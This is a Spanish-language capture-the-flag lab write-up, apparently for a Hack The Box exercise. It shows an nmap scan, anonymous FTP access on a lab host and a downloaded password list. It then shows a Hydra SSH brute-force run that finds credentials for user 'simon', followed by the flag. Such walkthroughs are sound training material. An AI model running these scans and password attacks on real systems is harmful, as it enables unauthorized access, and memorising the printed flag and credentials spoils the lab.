El segundo servidor es interno (dentro del dominio inlanefreight.htb) y gestiona y almacena correos electrónicos y archivos, además de servir como respaldo de algunos procesos de la empresa. Según conversaciones internas, su uso es relativamente poco frecuente y, en la mayoría de los casos, hasta ahora solo se ha utilizado con fines de prueba.

**2.  Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.**

Con un escaneo básico de nmap observo:
```
sudo nmap -sSCV --open --min-rate 10000 -Pn -n 10.129.201.127 -oA target -p- -vvv
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```

```
2121/tcp  open  ftp      syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
30021/tcp open  ftp      syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
```

Ejecutando:
```
ftp 10.129.201.127 2121
ftp 10.129.201.127 30021
```
Solo en el segundo puedo autenticarme como "anonymous:"
Me descargo un archivo llamado "mynotes.txt" de una carpeta llamada "simon", de lo que parece un listado de contraseñas.

```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

Pues, tengo un usuario "simon" con un conjunto de credenciales que probaré en cada uno de estos servicios:
```
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```

Pues en el primer servicio que pruebo me devuelve un mensaje conforme se ha crackeado:
```
hydra -l "simon" -P mynotes.txt ssh://10.129.190.119 -t 5
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 11:56:42
[DATA] max 5 tasks per 1 server, overall 5 tasks, 8 login tries (l:1/p:8), ~2 tries per task
[DATA] attacking ssh://10.129.190.119:22/
[22][ssh] host: 10.129.190.119   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 11:56:48
```

Siendo las credenciales de ssh "simon:8Ns8j1b!23hs4921smHzwn"

Ingreso por SSH:
```
ssh simon@10.129.190.119
```

Y encuentro la flag:
```
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```